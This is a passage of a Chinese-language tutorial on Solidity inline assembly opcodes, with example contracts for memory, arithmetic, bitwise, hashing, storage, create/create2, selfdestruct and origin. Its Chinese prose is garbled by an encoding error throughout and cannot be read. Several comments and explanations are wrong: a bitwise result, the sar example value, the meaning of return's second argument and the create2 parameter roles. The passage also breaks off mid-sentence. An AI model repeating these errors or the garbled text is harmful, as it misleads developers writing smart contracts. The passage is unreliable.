t4) - F ä»¥ mem[pâ€¦(p + s)) çš„æ•°æ®å’Œ topic t1ã€t2ã€t3 å’Œ t4 äº§ç”Ÿæ—¥å¿— origin F äº¤æ˜“å‘èµ·è€…åœ°å€ gasprice F äº¤æ˜“æ‰€æŒ‡å®šçš„ gas ä»·æ ¼ blockhash(b) F åŒºå—å· b çš„å“ˆå¸Œ - ç›®å‰ä»…é€‚ç”¨äºä¸åŒ…æ‹¬å½“å‰åŒºå—çš„æœ€å 256 ä¸ªåŒºå— coinbase F å½“å‰çš„æŒ–çŸ¿æ”¶ç›Šè€…åœ°å€ timestamp F ä»å½“å‰ epoch å¼€å§‹çš„å½“å‰åŒºå—æ—¶é—´æˆ³ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ number F å½“å‰åŒºå—å· difficulty F å½“å‰åŒºå—éš¾åº¦ gaslimit F å½“å‰åŒºå—çš„ gas ä¸Šé™ 2.1 åŸºç¡€æ“ä½œç çš„æ¼”ç¤º2.1.1 mstoreçš„ç”¨æ³•è¯­æ³•ï¼š 1mstore(position, value) å…¶ä¸­ï¼Œposition æ˜¯è¦å†™å…¥çš„å†…å­˜ä½ç½®ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ï¼›value æ˜¯è¦å†™å…¥çš„æ•°æ®ã€‚æ³¨æ„ï¼Œvalue çš„å¤§å°å¿…é¡»æ˜¯ 32 å­—èŠ‚ã€‚ æ¼”ç¤ºï¼š 1234567function mstore() external pure returns(uint) &#123; // 123 uint num = 123; assembly &#123; mstore(0x00, num) // æˆ– mstore(0x00, 123) return(0x00, 0x20) &#125;&#125; è¿”å›çš„ç»“æœï¼š 2.1.2 returnçš„ç”¨æ³•è¯­æ³•ï¼š 1return(start, end) å…¶ä¸­start æ˜¯è¦è¯»å–çš„èµ·å§‹å†…å­˜ä½ç½®ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ï¼›end æ˜¯è¦è¯»å–çš„ç»“å°¾å†…å­˜ä½ç½®ã€‚æ³¨æ„ï¼Œend çš„å¤§å°å¿…é¡»æ˜¯ 32 å­—èŠ‚çš„å€æ•°ã€‚ ç¤ºä¾‹ï¼š ä¸€ä¸ªè¿”å›å€¼ï¼š 12345678function _return1() external pure returns(uint) &#123; uint num = 999; assembly &#123; mstore(0x00, num) mstore(0x20, 33) return(0x20, 0x40) &#125;&#125; ä¸€ä¸ªä»¥ä¸Šçš„è¿”å›å€¼ï¼š å¦‚æœå‡½æ•°æœ‰å¤šä¸ªè¿”å›å€¼ï¼Œåˆ™å¿…é¡»å°†å®ƒä»¬æ‰“åŒ…æˆä¸€ä¸ªå…ƒç»„ 12345678function _return2() external pure returns(uint,uint) &#123; uint num = 666; assembly &#123; mstore(0x00, num) mstore(0x20, 999) return(0x00, 0x40) &#125;&#125; ä¸¤ä¸ªç¤ºä¾‹çš„è¿è¡Œç»“æœï¼š 2.1.3 ç®—æœ¯è¿ç®—addï¼Œsubï¼Œmulï¼Œdivï¼Œmodï¼Œexpçš„ç”¨æ³•è¯­æ³•ï¼š 123456add(value1, value2)sub(value1, value2)mul(value1, value2)div(value1, value2)mod(value1, value2)exp(value1, value2) å…¶ä¸­ï¼Œvalue1 å’Œ value2 æ˜¯è¦ç›¸åŠ ï¼Œå‡ï¼Œä¹˜ï¼Œé™¤ï¼Œå–æ¨¡ï¼Œå¹‚è¿ç®—çš„ä¸¤ä¸ªå€¼ã€‚ ç¤ºä¾‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647function add(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := add(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function sub(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := sub(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function mul(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := mul(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function div(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := div(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function mod(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := mod(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function exp(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := exp(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125; è¿è¡Œç»“æœï¼š 2.1.4 ä½è¿ç®—ï¼šnot,and,or,xor,shl,shr,sarä½è¿ç®—çŸ¥è¯†åº“ 1234567not(x) // ~xï¼Œå¯¹ x æŒ‰ä½å–åand(x,y) // x å’Œ y çš„æŒ‰ä½ä¸or(x,y) // x å’Œ y çš„æŒ‰ä½æˆ–xor(x,y) // x å’Œ y çš„æŒ‰ä½å¼‚æˆ–shl(x,y) // å°† y é€»è¾‘å·¦ç§» x ä½shr(x,y) // å°† y é€»è¾‘å³ç§» x ä½sar(x,y) // å°† y ç®—æœ¯å³ç§» x ä½ ç¤ºä¾‹ï¼š uintçš„å–å€¼çš„èŒƒå›´æ˜¯ï¼š[0,115792089237316195423570985008687907853269984665640564039457584007913129639935] 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182/*0:uint256: 11:uint256:115792089237316195423570985008687907853269984665640564039457584007913129639934*/function not(uint num) external pure returns(uint, uint) &#123; assembly &#123; let result := num mstore(0x00, result) mstore(0x20, not(result)) return(0x00,64) &#125;&#125;// 1010// 1011// 1010 = 10function and(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := and(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;// 1010// 1011// 1011 = 11function or(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := or(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;// 1010// 1011// 1011 = 1function xor(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := xor(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;// é€»è¾‘å·¦ç§» å°† n2 å·¦ç§» n1 ä½// 0001// &lt;&lt; 2// 0100 = 4function shl(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := shl(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;// é€»è¾‘å³ç§» å°† n2 å³ç§» n1 ä½// 0100// &gt;&gt; 2// 0001 = 1function shr(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := shr(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;// ç®—æœ¯å³ç§» å°† n2 ç®—æœ¯å³ç§» n1 ä½// 1011 = 11// &gt;&gt; 2// 0010 = 14function sar(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := sar(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125; è¿è¡Œç»“æœï¼š å…¶ä¸­ï¼Œshrå’Œsarçš„ç»“æœæ˜¯ç›¸åŒçš„ï¼Œæˆ‘è®¤ä¸ºè¿™å’Œsolidtiyä¸­æ— ç¬¦å·æ•´æ•°æœ‰å…³ 2.1.5 æ¯”è¾ƒè¿ç®—ç¬¦ï¼šlt,gt,eq,iszeroè¯­æ³•ï¼š 1234lt(x, y) // å¦‚æœ x &lt; y ä¸º 1ï¼Œå¦åˆ™ä¸º 0gt(x, y) // å¦‚æœ x &gt; y ä¸º 1ï¼Œå¦åˆ™ä¸º 0eq(x, y) // å¦‚æœ x == y ä¸º 1ï¼Œå¦åˆ™ä¸º 0iszero(x) // å¦‚æœ x == 0 ä¸º 1ï¼Œå¦åˆ™ä¸º 0 ç¤ºä¾‹ï¼š 1234567891011121314151617181920212223242526272829303132function lt(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := lt(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function gt(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := gt(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125; function eq(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := eq(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125; function iszero(uint n1) external pure returns(uint) &#123; assembly &#123; let result := iszero(n1) mstore(0x00, result) return(0x00, 0x20) &#125;&#125; è¿è¡Œç»“æœï¼š å¿ƒå¾—ï¼šæˆ‘è§‰å¾—è¿™ä¸ªæ“ä½œç ç®€å•ç†è§£èµ·æ¥å°±æ˜¯ï¼šæ“ä½œæ˜¯ä¸€å›äº‹ï¼Œå­˜æ˜¯ä¸€å›äº‹ï¼Œå–åˆæ˜¯å¦ä¸€å›äº‹ã€‚å…ˆæ“ä½œï¼Œå†å­˜ï¼Œæœ€åå–ï¼Œä¾‹å¦‚ï¼š 123let sum := add(x,y)mstore(0x00, sum)return(0x00, 0x20) *** è¿™å°±æ˜¯å…¸å‹çš„å…ˆæ‰§è¡Œ addæ“ä½œï¼Œå†å°†ç®—å‡ºæ¥çš„ sum ç»“æœä¿å­˜åˆ° EVMä¸­ï¼Œæœ€åå†ä»EVMä¸­å–å‡ºæ¥*** 2.2 è¿›é˜¶æ“ä½œç çš„æ¼”ç¤º2.2.1 addmod,mulmodçš„ç”¨æ³•è¯­æ³•ï¼š 12addmod(x, y, m) //ä»»æ„ç²¾åº¦çš„ (x + y) % mmulmod(x, y, m) //ä»»æ„ç²¾åº¦çš„ (x * y) % m â€œaddmodâ€ æ“ä½œç¬¦çš„è¯­æ³•ä¸ºï¼šaddmod(x, y, m)ã€‚å®ƒå°†ä¸¤ä¸ªå‚æ•° x å’Œ y ç›¸åŠ ï¼Œç„¶åå°†ç»“æœå¯¹å‚æ•° m å–æ¨¡ï¼Œæœ€åè¿”å›ç»“æœã€‚â€mulmodâ€åŒç†ã€‚ ç¤ºä¾‹ï¼š 1234567891011121314151617function _addmod(uint256 x, uint256 y, uint256 m) public pure returns (uint256) &#123; uint256 result; assembly &#123; result := addmod(x, y, m) &#125; return result;&#125;function _mulmod(uint256 x, uint256 y, uint256 m) public pure returns (uint256) &#123; uint256 result; assembly &#123; result := mulmod(x, y, m) &#125; return result;&#125; è¿è¡Œç»“æœï¼š 2.2.2 keccak256çš„ç”¨æ³•å…³äºstringç±»å‹çš„å­˜å‚¨æ–¹å¼ è¯­æ³•ï¼š 1keccak256(p, n) //keccak(mem[p...(p + n))) ç¤ºä¾‹ï¼š 12345678910111213141516171819function _keccak256(string memory message) public pure returns (bytes32) &#123; bytes32 result; assembly &#123; result := keccak256(add(message, 32), mload(message)) &#125; return result; &#125;function _keccak256_1(string memory message) public pure returns (bytes32) &#123; bytes32 result = keccak256(abi.encodePacked(message)); return result; &#125;function _keccak256_2(string memory message) public pure returns (bytes32) &#123; bytes32 result = keccak256(abi.encode(message)); return result; &#125; è¿è¡Œç»“æœï¼š ä»ç»“æœä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ±‡ç¼–ä¸­çš„keccak256ä½¿ç”¨çš„æ‰“åŒ…æ–¹å¼æ˜¯ç´§æ‰“åŒ…å³abi.encodePacked() æ‹“å±•ï¼š è§£è¯»ï¼š assembly &#123;result := keccak256(add(message, 32), mload(message))&#125; é¦–å…ˆçŸ¥é“ï¼Œstringç±»å‹çš„å˜é‡åœ¨ EVMä¸­çš„å­˜å‚¨æ–¹å¼ç±»ä¼¼äºåŠ¨æ€æ•°ç»„ï¼Œåœ¨æ™ºèƒ½åˆçº¦çš„ä¹¦å†™ä½ç½®å³æ’æ§½slotå­˜å‚¨çš„æ˜¯ï¼Œstringå˜é‡å€¼å­˜å‚¨çš„ä½ç½®ï¼Œè€Œåœ¨å­˜å‚¨å…·ä½“ä½ç½®ä¸Šï¼Œstringå˜é‡å‰32ä½å­˜å‚¨çš„æ˜¯stringå€¼çš„é•¿åº¦ï¼Œ32ä½ä¹‹åæ‰æ˜¯å…·ä½“çš„ stringå˜é‡çš„å€¼ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»£ç éªŒè¯ä¸€ä¸‹ï¼š 1234function _stringToBytes(string memory message) public pure returns (bytes memory) &#123; bytes memory result = (abi.encode(message)); return result;&#125; è¿è¡Œç»“æœï¼š ç”±è¿è¡Œç»“æœçš„ä¸‰ä¸ªéƒ¨åˆ†æˆ‘ä»¬çœ‹å‡ºï¼š 2: æ˜¯å‚æ•°biyou åœ¨å†…å­˜ä¸­çš„å­˜å‚¨ä½ç½®ï¼ˆåº”è¯¥æ˜¯slot2ï¼‰ï¼› 5: æ˜¯å‚æ•°biyouçš„é•¿åº¦ï¼› 6269796f75:å‚æ•°çš„å†…å®¹ï¼š &quot;biyou&quot; çš„ UTF-8 ç¼–ç ï¼ˆåœ¨è¿™é‡Œç­‰åŒäº ASCII ç¼–ç ï¼‰ï¼Œå¹¶åœ¨å³ä¾§ï¼ˆä½ä½ï¼‰ç”¨ 0 å€¼å­—èŠ‚è¡¥å……åˆ° 32 å­—èŠ‚ã€‚ å…¶æ¬¡ï¼Œ(add(message, 32)ï¼Œæ˜¯ä¸ºäº†æ‰¾åˆ° messageåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œå¯ä»¥ç†è§£ä¸ºï¼Œç»è¿‡ (add(message, 32)è¿™ä¸€æ­¥éª¤ä¹‹åï¼Œmessageçš„æŒ‡é’ˆå·²ç»æŒ‡å‘äº†åŒ…æ‹¬ messageçš„é•¿åº¦ä»¥åŠå…·ä½“æ•°æ®è¿™ä¸ªæ•´ä½“çš„ç¬¬ä¸€ä¸ªç´¢å¼•ï¼ˆç»è¿‡å®é™…éªŒè¯ä¹‹åè¿™æ˜¯é”™è¯¯çš„ï¼‰ç”±å¦‚ä¸‹ä»£ç ä»¥åŠç»“æœå¯çŸ¥ï¼Œ(add(message, 32)æŒ‡å‘çš„æ˜¯è·³è¿‡äº†å­—ç¬¦ä¸²é•¿åº¦ï¼Œå­—ç¬¦ä¸²å…·ä½“å€¼çš„ç¬¬ä¸€ä¸ªç´¢å¼•ã€‚ ä»£ç ï¼š 1234567function add(string memory message) public pure returns (bytes32) &#123; bytes32 result; assembly &#123; result := add(message, 32) return(result,32) &#125; &#125; è¿è¡Œç»“æœï¼š è¯´æ˜ï¼šå¦‚æœç›´æ¥å¡«å…¥messageå¥½åƒä¼šè‡ªåŠ¨æ‰¾åˆ°messageå€¼çš„å…·ä½“å­˜å‚¨ä½ç½® ç„¶åï¼Œmload(message)ï¼Œåˆ™æ˜¯æ‰¾åˆ°messageçš„é•¿åº¦ï¼Œé€šè¿‡ä»£ç éªŒè¯ ä»£ç ï¼š 1234567function mload(string memory message) public pure returns (bytes32) &#123; bytes32 result; assembly &#123; result := mload(message) &#125; return result;&#125; è¿è¡Œç»“æœï¼š æ€»ç»“ï¼šadd(message, 32)å…ˆå°†æŒ‡é’ˆæŒ‡å‘messageå…·ä½“çš„å€¼, mload(message)è·å–messageçš„é•¿åº¦ï¼Œkeccak256(add(message, 32), mload(message))åˆ™æ˜¯å¯¹messageå…·ä½“çš„å€¼è¿›è¡Œhashï¼Œå³keccak256(0x6269796f75000000000000000000000000000000000000000000000000000000),å…¶ç»“æœå’Œkeccak256(abi.encodePacked(message))ç»“æœç›¸åŒã€‚ 2.2.3 mloadçš„ç”¨æ³•è¯­æ³•ï¼š 1mload(p) //mem[p...(p + 32)) è¯»å–æŒ‡å®šä½ç½®påçš„ 32ä½å†…å­˜åœ°å€ä¸­çš„å€¼ ç¤ºä¾‹ï¼š 1234567891011function mload(uint index) public pure returns(uint) &#123; uint result; assembly &#123; let n1 := 666 let n2 := 999 mstore(0x00,n1) mstore(0x20,n2) result := mload(index) &#125; return result;&#125; è¿è¡Œç»“æœï¼š 2.2.4 numberçš„ç”¨æ³•è¯­æ³•ï¼š 1number() // å½“å‰åŒºå— ç¤ºä¾‹ï¼š 1234567function getCurrentInstructionNumber() public view returns (uint) &#123; assembly &#123; let instructionNumber := number() mstore(0x00,instructionNumber) return(0x00,32) &#125;&#125; è¿è¡Œç»“æœï¼š 2.2.5 sload å’Œ sstoreçš„ç”¨æ³•è¯­æ³•ï¼š 12sload(p) // storage[p]sstore(p, v) // storage[p] := v â‘  å…¶ä¸­ï¼Œpæ˜¯ä¸€ä¸ªuintç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºè¦è¯»å–å­—çš„å­˜å‚¨å™¨åœ°å€ã€‚sloadæŒ‡ä»¤çš„ä½œç”¨æ˜¯ä»ä»¥pä¸ºåœ°å€çš„å­˜å‚¨å™¨ä½ç½®ä¸­è¯»å–ä¸€ä¸ªå­—ï¼Œå¹¶å°†å…¶ä½œä¸ºuintç±»å‹çš„å€¼è¿”å›ã€‚ç±»ä¼¼äºä½¿ç”¨web3 æˆ– etherjsçš„ gerAtStorage(p)çš„æ“ä½œ â‘¡ å…¶ä¸­ï¼Œpæ˜¯ä¸€ä¸ªuintç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºè¦å­˜å‚¨å­—çš„å­˜å‚¨å™¨åœ°å€ï¼Œvæ˜¯ä¸€ä¸ªuintç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºè¦å­˜å‚¨çš„å­—çš„å€¼ã€‚sstoreæŒ‡ä»¤çš„ä½œç”¨æ˜¯å°†vå­˜å‚¨åˆ°ä»¥pä¸ºåœ°å€çš„å­˜å‚¨å™¨ä½ç½®ä¸­ã€‚å…·ä½“æ¥è¯´ï¼ŒsstoreæŒ‡ä»¤å°†å­—èŠ‚åºåˆ—vçš„å‰32ä¸ªå­—èŠ‚å­˜å‚¨åˆ°ä»¥pä¸ºåœ°å€çš„å­˜å‚¨å™¨ä½ç½®ä¸­ã€‚ ç¤ºä¾‹ï¼š 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;= 0.8.0;contract assembly_day1 &#123; address owner; constructor() &#123; owner = msg.sender; &#125; // æŸ¥è¯¢å½“å‰åˆçº¦çš„æ‹¥æœ‰è€… function getOwner() external view returns(address) &#123; return owner; &#125; function sload(uint position) public view returns (uint) &#123; uint value; assembly &#123; value := sload(position) &#125; return value; &#125; function sstore(uint position,uint _addr) public returns (uint) &#123; assembly &#123; sstore(position, _addr) let result := sload(position) return(mul(position, 32), 32) &#125; &#125;&#125; è¿è¡Œç»“æœï¼š è°ƒç”¨sstoreä¹‹å‰ï¼š è°ƒç”¨sstoreä¹‹åï¼š 2.2.6 msizeçš„ç”¨æ³•è¯­æ³•ï¼š 1msize() //å†…å­˜å¤§å°ï¼Œå³æœ€å¤§å¯è®¿é—®å†…å­˜ç´¢å¼• msizeæŒ‡ä»¤çš„ä½œç”¨æ˜¯è¿”å›å½“å‰åˆçº¦çš„å­˜å‚¨å™¨å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚å­˜å‚¨å™¨å¤§å°æ˜¯å½“å‰åˆçº¦çš„å­˜å‚¨å™¨ä½¿ç”¨é‡ï¼Œç”¨äºå­˜å‚¨åˆçº¦çš„çŠ¶æ€å˜é‡å’Œå…¶ä»–æ•°æ®ã€‚ ç¤ºä¾‹ï¼š 1234567function msize() public view returns (uint) &#123; uint size; assembly &#123; size := msize() &#125; return size;&#125; è¿è¡Œç»“æœï¼š 2.2.7 gasçš„ç”¨æ³•è¯­æ³•ï¼š 1gas() // æ‰§è¡Œå¯ç”¨çš„ gas gasæ ‡è¯†ç¬¦è¿”å›ä¸€ä¸ªuintç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºå½“å‰åˆçº¦ä¸­å¯ç”¨çš„ç‡ƒæ–™æ•°é‡ã€‚ç‡ƒæ–™æ˜¯ä¸€ç§ä»£å¸ï¼Œç”¨äºæ”¯ä»˜äº¤æ˜“è´¹ç”¨å’Œåˆçº¦æ‰§è¡Œè´¹ç”¨ã€‚åœ¨Solidityä¸­ï¼Œå¯ä»¥ä½¿ç”¨gasæ ‡è¯†ç¬¦è·å–å½“å‰åˆçº¦ä¸­è¿˜å‰©ä½™çš„ç‡ƒæ–™æ•°é‡ï¼Œä»¥ä¾¿åœ¨æ‰§è¡Œåˆçº¦ä»£ç æ—¶è¿›è¡Œç›¸åº”çš„æ§åˆ¶ã€‚ ç¤ºä¾‹ï¼š 1234567function gas() public view returns (uint) &#123; uint remaining; assembly &#123; remaining := gas() &#125; return remaining;&#125; è¿è¡Œç»“æœï¼š 2.2.8 addressçš„ç”¨æ³•è¯­æ³•ï¼š 1address() //å½“å‰åˆçº¦ / æ‰§è¡Œä¸Šä¸‹æ–‡çš„åœ°å€ addressæ ‡è¯†ç¬¦å¯ä»¥ä¸å…¶ä»–æŒ‡ä»¤ç»“åˆä½¿ç”¨ï¼Œç”¨äºè·å–åˆçº¦åœ°å€æˆ–å…¶ä»–åœ°å€çš„ä¿¡æ¯ã€‚ ç¤ºä¾‹ï¼š 123456789101112131415function getContractAddress() public view returns (address) &#123; address addr; assembly &#123; addr := address() &#125; return addr;&#125;function getCallerAddress() public view returns (address) &#123; address addr; assembly &#123; addr := caller() &#125; return addr;&#125; è¿è¡Œç»“æœï¼š 2.2.9 balanceçš„ç”¨æ³•è¯­æ³•ï¼š 1balance(a) // åœ°å€ a çš„ä½™é¢ï¼Œä»¥ wei ä¸ºå•ä½ å…¶ä¸­ï¼Œaæ˜¯ä¸€ä¸ªåœ°å€ç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºè¦æŸ¥è¯¢ä½™é¢çš„åœ°å€ã€‚balanceæ ‡è¯†ç¬¦çš„ä½œç”¨æ˜¯è¿”å›æŒ‡å®šåœ°å€çš„ä½™é¢ï¼Œä»¥weiä¸ºå•ä½ã€‚ ç¤ºä¾‹ï¼š 1234567function getBalance(address account) public view returns (uint) &#123; uint _balance; assembly &#123; _balance := balance(account) &#125; return _balance;&#125; è¿è¡Œç»“æœï¼š 2.2.10 callerçš„ç”¨æ³•è¯­æ³•ï¼š 1caller() // è°ƒç”¨å‘èµ·è€… calleræ ‡è¯†ç¬¦è¿”å›ä¸€ä¸ªaddressç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºå½“å‰å‡½æ•°çš„è°ƒç”¨è€…åœ°å€ã€‚è°ƒç”¨è€…æ˜¯æŒ‡è°ƒç”¨å½“å‰å‡½æ•°çš„åˆçº¦æˆ–å¤–éƒ¨è´¦æˆ·ã€‚ ç¤ºä¾‹ï¼š 1234567function getCaller() public view returns (address) &#123; address callerAddr; assembly &#123; callerAddr := caller() &#125; return callerAddr;&#125; è¿è¡Œç»“æœï¼š 2.2.11 extcodesizeçš„ç”¨æ³•è¯­æ³•ï¼š 1extcodesize(address) //åœ°å€ address çš„ä»£ç å¤§å° å…¶ä¸­ï¼Œaddressè¡¨ç¤ºè¦è·å–ä»£ç é•¿åº¦çš„åˆçº¦åœ°å€ã€‚ ç¤ºä¾‹ï¼š 1234567function extcodesize(address _test) external view returns(uint) &#123; assembly &#123; let size := extcodesize(_test) mstore(0x00, size) return(0x00, 0x20) &#125;&#125; è¿è¡Œç»“æœï¼š 2.2.12 createçš„ç”¨æ³•è¯­æ³•ï¼š 1create(v, p, s) // ç”¨ mem[p...(p + s)) ä¸­çš„ä»£ç åˆ›å»ºä¸€ä¸ªæ–°åˆçº¦ã€å‘é€ v wei å¹¶è¿”å› æ–°åœ°å€ å…¶ä¸­ï¼Œvè¡¨ç¤ºè¦å‘æ–°åˆçº¦å‘é€çš„ä»¥å¤ªå¸æ•°é‡ï¼Œpè¡¨ç¤ºè¦å¤åˆ¶åˆ°æ–°åˆçº¦åœ°å€å†…å­˜ä¸­çš„ä»£ç çš„åç§»é‡ï¼Œsè¡¨ç¤ºè¦å¤åˆ¶åˆ°æ–°åˆçº¦åœ°å€å†…å­˜ä¸­çš„ä»£ç çš„é•¿åº¦ã€‚ ç¤ºä¾‹ï¼š 123456789101112131415161718192021222324252627// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;= 0.8.0;contract test &#123; string public name; constructor() &#123; name = &quot;biyou&quot;; &#125;&#125;contract assembly_day2 &#123; function createNewContract(uint value, bytes memory code) public returns (address) &#123; address newContract; assembly &#123; newContract := create( value, // è¡¨ç¤ºè¦å‘æ–°åˆçº¦å‘é€çš„ä»¥å¤ªå¸æ•°é‡ add(code, 0x20), // è¡¨ç¤ºè·³è¿‡æ•°ç»„é•¿åº¦ mload(code)) // è¯»å–codeçš„é•¿åº¦ &#125; return newContract; &#125;&#125; è¿è¡Œç»“æœï¼š 2.2.13 create2çš„ç”¨æ³•è¯­æ³•ï¼š 1create2(v, n, p, s) // ç”¨ mem[p...(p + s)) ä¸­çš„ä»£ç ï¼Œåœ¨åœ°å€ keccak256(&lt;address&gt; . n . keccak256(mem[p...(p + s))) ä¸Š åˆ›å»ºæ–°åˆçº¦ã€å‘é€ v wei å¹¶è¿”å›æ–°åœ°å€ å…¶ä¸­ï¼Œvè¡¨ç¤ºè¦å‘æ–°åˆçº¦å‘é€çš„ä»¥å¤ªå¸æ•°é‡ï¼Œnè¡¨ç¤ºè¦å¤åˆ¶åˆ°æ–°åˆçº¦åœ°å€å†…å­˜ä¸­çš„ä»£ç çš„åç§»é‡ï¼Œpè¡¨ç¤ºè¦å¤åˆ¶åˆ°æ–°åˆçº¦åœ°å€å†…å­˜ä¸­çš„ä»£ç çš„é•¿åº¦ï¼Œsæ˜¯ä¸€ä¸ªä»»æ„çš„32å­—èŠ‚å€¼ï¼Œç”¨äºç”Ÿæˆæ–°åˆçº¦åœ°å€ã€‚ ç¤ºä¾‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;= 0.8.0;contract test &#123; string public name; constructor() &#123; name = &quot;biyou&quot;; &#125;&#125;contract assembly_day2 &#123; // /* ä½¿ç”¨ä»£ç ä¸­ create2() */ function create2NewContractByCode(string memory salt) public view returns (address) &#123; bytes memory code = type(test).creationCode; address result = address(uint160(uint( keccak256( abi.encodePacked( uint8(0xff), address(this), keccak256(abi.encodePacked(salt)), keccak256(code) ) ) ))); return result; &#125; // /* ä½¿ç”¨å†…è”æ±‡ç¼–è‡ªå¸¦çš„ create2() */ function create2NewContractByInline(string memory salt) public returns (address) &#123; bytes memory code = type(test).creationCode; bytes32 _salt = keccak256(abi.encodePacked(salt)); address result; assembly &#123; result := create2( 0, // value è¡¨ç¤ºè¦å‘æ–°åˆçº¦å‘é€çš„ä»¥å¤ªå¸æ•°é‡ add(code, 32), // è¡¨ç¤ºè·³è¿‡æ•°ç»„é•¿åº¦ mload(code), // è¯»å–codeçš„é•¿åº¦ _salt // ç› ) &#125; return result; &#125;&#125; è¿è¡Œç»“æœï¼š ç”±ç»“æœå¯ä»¥çœ‹å‡ºï¼Œé‡‡ç”¨ä¸¤ç§æ–¹æ³•åˆ›å»ºå‡ºçš„æ–°åˆçº¦åœ°å€æ˜¯ç›¸åŒçš„ï¼› éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸¤ç§æ–¹æ³•ä¸­å„å‚æ•°æ‰€å¤„çš„ä½ç½®æ˜¯å¾ˆä¸ç›¸åŒçš„ã€‚ 2.2.14 selfdestructçš„ç”¨æ³•è¯­æ³•ï¼š 1selfdestruct(_addr) // _addrè¡¨ç¤ºåˆçº¦æ³¨é”€ä¹‹åé’±è½¬ç§»çš„åœ°å€ addressè¡¨ç¤ºè¦å°†å‰©ä½™çš„ä»¥å¤ªå¸å‘é€åˆ°çš„ç›®æ ‡åœ°å€ã€‚ ç¤ºä¾‹ï¼š 12345function _selfdestruct(address _addr) external payable &#123; assembly &#123; selfdestruct(_addr) &#125;&#125; è¿è¡Œç»“æœï¼š æœªæ‰§è¡Œå‰ï¼š contract testçš„ä½™é¢ï¼š æ‰§è¡Œä¹‹åï¼š contract testçš„ä½™é¢ï¼š 2.2.15 originçš„ç”¨æ³•è¯­æ³•ï¼š 1origin() originæŒ‡ä»¤ç”¨äºè·å–å½“å‰äº¤æ˜“çš„å‘é€è€…åœ°å€ã€‚ä¸msg.senderä¸åŒçš„æ˜¯ï¼ŒoriginæŒ‡ä»¤è¿”å›çš„æ˜¯äº¤æ˜“çš„æœ€åˆå‘é€è€…åœ°å€ï¼Œå³äº¤æ˜“é“¾çš„èµ·ç‚¹ã€‚ ç¤ºä¾‹ï¼š 1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;= 0.8.0;contract test &#123; string public name; constructor() &#123; name = &quot;biyou&quot;; &#125; function testOrigin(address _addr) public view returns(address) &#123; address result = assembly_day2(_addr).origin(); return result; &#125;&#125;contract assembly_day2 &#123; constructor() payable &#123; &#125; function origin() public view returns (address) &#123; address _origin; assembly &#123; _origin := origin() &#125; return _origin; &#125;&#125; è¿è¡Œç»“æœï¼š 2.2.16 blockhashçš„ç”¨æ³•è¯­æ³•ï¼š 1blockhash(blockNumber) //åŒºå—å· blockNumber çš„å“ˆå¸Œ - ç›®å‰ä»…é€‚ç”¨äºä¸åŒ…æ‹¬å½“å‰åŒºå—çš„æœ€å 256 ä¸ªåŒºå— blockNumberè¡¨ç¤ºè¦è·å–å“ˆå¸Œå€¼çš„å—å·ã€‚è¯·æ³¨æ„ï¼Œç”±äºEthereumåŒºå—é“¾çš„è®¾è®¡ï¼Œåªèƒ½è·å–æœ€è¿‘çš„256ä¸ªå—çš„å“ˆå¸Œå€¼ã€‚å› æ­¤ï¼ŒblockNumberçš„å€¼å¿…é¡»åœ¨å½“å‰å—ä¸æœ€è¿‘çš„256ä¸ªå—ä¹‹é—´ã€‚ ç¤ºä¾‹ï¼š 123456789101112// å¦‚ä¸‹å†™æ³•hashçš„å€¼æ˜¯ 0x0000000000000000000000000000000000000000000000000000000000000000// å› ä¸º 